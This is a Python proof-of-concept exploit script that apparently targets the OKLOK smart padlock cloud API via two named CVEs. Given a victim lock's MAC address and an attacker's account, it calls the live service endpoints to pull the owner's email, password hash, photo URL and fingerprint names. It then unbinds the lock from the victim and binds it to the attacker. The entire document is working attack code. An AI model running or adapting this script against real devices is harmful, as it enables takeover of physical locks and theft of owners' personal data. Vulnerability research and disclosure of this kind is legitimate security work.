#!/usr/bin/env python3

#PoC physically proximate attack scenario based on CVE-2020-8791 and CVE-2019-13143 
#See original CVE-2019-13143 PoC exploit code by securelayer7 (https://github.com/securelayer7/pwnfb50/blob/master/pwnfb50.py)

#unbind lock from OKLOK victim account, bind to attacker account, retrieve user account details

import requests
import json
import sys
import datetime
import getpass

#login to the attacker account and obtain attacker token to be used in further HTTP requests
#get attacker user ID for binding the lock later
def login_attacker(attacker_email_address, attacker_password):
        
    url = 'https://app.oklok.com.cn/oklock/user/loginByPassword'
    body = {"code":attacker_password,"account":attacker_email_address,"type":"0"}

    login_headers = {'Host': 'app.oklok.com.cn',
    'Content-Type': 'application/json',
    'Connection': 'keep-alive',
    'Accept': '*/*',
    'User-Agent': 'OKLOK/3.1.1 (iPhone; iOS 13.3; Scale/2.00)',
    'Accept-Language': 'en-US;q=1',
    'Content-Length': '70',
    'Accept-Encoding': 'gzip, deflate, br'}

    print('\n-------------------------------------------------------------')
    print('Logging in...')

    
    response = requests.post(url, data=json.dumps(body), headers=login_headers)
    json_resp = response.json()
    status = json_resp['status']
    if status == '2000':
        print('Login successful!\n')
        print('Login Details:')
        result = json_resp['result']
        attacker_token = result['token']
        attacker_userID = result['userId']
        print('attacker_token: ' + str(attacker_token))
        print('attacker_userId: ' + str(attacker_userID))
        print('-------------------------------------------------------------\n')
        return attacker_token, attacker_userID

    else:
        sys.exit('Login not successful.')

#retrieve lockId, barcode, lock name
def device_query(attacker_token, victim_mac, headers):
   
    url = 'https://app.oklok.com.cn/oklock/lock/queryDevice'
    body = {"mac":victim_mac}

    print('Querying device...')
    response = requests.post(url, data=json.dumps(body), headers=headers)
    json_resp = response.json()
    result = json_resp['result']
    status = json_resp['status']
    if status == '2000':
        lockId = result['id']
        barcode = result['barcode']
        name = result['name']
        print('Query successful.')
        print('-------------------------------------------------------------\n')
    else:
        sys.exit('HTTP Error -- Query not successful.')
    return lockId, barcode, name

#get userId, email
def device_info(barcode, attacker_token, headers):
   
    url = 'https://app.oklok.com.cn/oklock/lock/getDeviceInfo'
    body = {"barcode":barcode}

    print('Getting userId...')
    response = requests.post(url, data=json.dumps(body), headers=headers)
    json_resp = response.json()
    result = json_resp['result']
    status = json_resp['status']
    if status == '2000':
        userId = result['userId']
        email = result['account']
        print('Query successful.')
        print('-------------------------------------------------------------\n')

    else:
        sys.exit('HTTP Error -- Query not successful.')

    return userId, email

#get acct_creation, cid, nickname, password_hash, qrUrl, picUrl, prints_name
def get_more_info(victim_userID, attacker_token, lockId, headers):

    get_user_info = 'https://app.oklok.com.cn/oklock/user/getInfo'
    get_fingerprints_info = 'https://app.oklok.com.cn/oklock/lock/fingerprintList'
              
    body_user = {"userId":victim_userID}
    body_fingerprints = {"userId":victim_userID, "lockId":lockId}

    user_info = requests.post(get_user_info, data=json.dumps(body_user), headers=headers)
    fingerprints_info = requests.post(get_fingerprints_info, data=json.dumps(body_fingerprints), headers=headers)

    json_user_info = user_info.json()
    json_prints_info = fingerprints_info.json()

    user_result = json_user_info['result']
    user_status = json_user_info['status']

    prints_result = json_prints_info['result']
    prints_status = json_prints_info['status']

    print('Getting more user info...')
    if user_status == '2000':
        if len(user_result)!=0:
            acct_creation = user_result['createAt']
            cid = user_result['cid']
            nickname = user_result['nickName']
            password_hash = user_result['password']
            qrUrl = user_result['qrUrl']
            picUrl = user_result['picUrl']
            print('Retrieved more user info.')
            print('-------------------------------------------------------------\n')
    else:
        print('HTTP Error - Could not retrieve more user info.')
          
    print('Getting fingerprints info...')  
    if prints_status == '2000':
        if len(prints_result)!=0:
            prints_name = prints_result[0]['name']
            print('Retrieved fingerprint info.')
        else:
            prints_name = 'N/A'
    else:
        print('HTTP Error - Could not retrieve prints info.')

    return acct_creation, cid, nickname, password_hash, qrUrl, picUrl, prints_name

#unbind lock from victim account
def unbind(userId, lockId, attacker_token, headers):
   
    url = 'https://app.oklok.com.cn/oklock/lock/unbind'
    body = {"userId":userId,"lockId":lockId}

    print('-------------------------------------------------------------\n')
    print('Unbinding lock from victim...')

    response = requests.post(url, data=json.dumps(body), headers=headers)
    json_resp = response.json()
    status = json_resp['status']
    if status == '2000':
        print('Success!')
        print('-------------------------------------------------------------\n')
    else:
        sys.exit('HTTP Error Code -- Lock could not be unbound from victim.')

#bind lock to attacker account
def bind(attacker_userID, mac, name, attacker_token, headers):
   
    url = 'https://app.oklok.com.cn/oklock/lock/bind'
    body = {"isLock":"1","userId": attacker_userID,"mac":mac,"name":name}

    print('Binding lock to attacker...')

    response = requests.post(url, data=json.dumps(body), headers=headers)
    json_resp = response.json()
    status = json_resp['status']
    if status == '2000':
        print('Success!')
        print('-------------------------------------------------------------\n')
    else:
        sys.exit('HTTP Error -- Lock could not be bound to attacker.')


def main():

    start_time = datetime.datetime.now()

    if len(sys.argv) is not 3:
        sys.exit('Usage: python3 attack_scenario_proximate.py <victim_mac> <attacker_email_address>')
    else:
        victim_mac = sys.argv[1]
        attacker_email_address = sys.argv[2]
        attacker_password = getpass.getpass('Attacker Password: ')
    

    attacker_token_userId = login_attacker(attacker_email_address, attacker_password)
    attacker_token = attacker_token_userId[0]
    attacker_userID = attacker_token_userId[1]

    headers = {'Host': 'app.oklok.com.cn',
    'phoneModel': 'iPhone11,8',
    'Accept': '*/*',
    'appVersion': '3.1.1',
    'Accept-Language': 'en-US;q=1',
    'Accept-Encoding': 'gzip, deflate, br',
    'token': attacker_token,
    'Content-Type': 'application/json',
    'clientType': 'iOS',
    'language': 'en-US',
    'User-Agent': 'OKLOK/3.1.1 (iPhone; iOS 13.3; Scale/2.00)',
    'Connection': 'keep-alive',
    'osVersion': '13.3'}

    lockId_barcode_name = device_query(attacker_token, victim_mac, headers)
    lockId = lockId_barcode_name[0]
    barcode = lockId_barcode_name[1]
    name = lockId_barcode_name[2]

    userId_email = device_info(barcode, attacker_token, headers)
    victim_userID = userId_email[0]
    email = userId_email[1]

    more_info = get_more_info(victim_userID, attacker_token, lockId, headers)
    acct_creation = more_info[0]
    cid = more_info[1]
    nickname = more_info[2]
    password_hash = more_info[3]
    qrUrl = more_info[4]
    picUrl = more_info[5]
    prints_name = more_info[6]
    
    unbind(victim_userID, lockId, attacker_token, headers)
    bind(attacker_userID, victim_mac, name, attacker_token, headers)

    print('=============================================================')
    print('USER ACCOUNT INFO:')
    print('=============================================================')

    print('userId: ' + str(victim_userID))
    print('account creation: ' + str(acct_creation))
    print('cid: ' + str(cid))
    print('nickname: ' + str(nickname))
    print('email address: ' + str(email))
    print('password hash: ' + str(password_hash))
    print('qrUrl: ' + str(qrUrl))
    print('picUrl: ' + str(picUrl))
    print('lock name: ' + str(name))
    print('mac address: ' + str(victim_mac))
    print('barcode: ' + str(barcode))
    print('lockId: ' + str(lockId))
    print('registered prints: ' + str(prints_name))

    end_time = datetime.datetime.now()

    total_time = end_time - start_time

    print('\n-------------------------------------------------------------')
    print('Total Execution Time: ' + str(total_time))
    print('-------------------------------------------------------------\n')

if __name__ == '__main__':
    main()

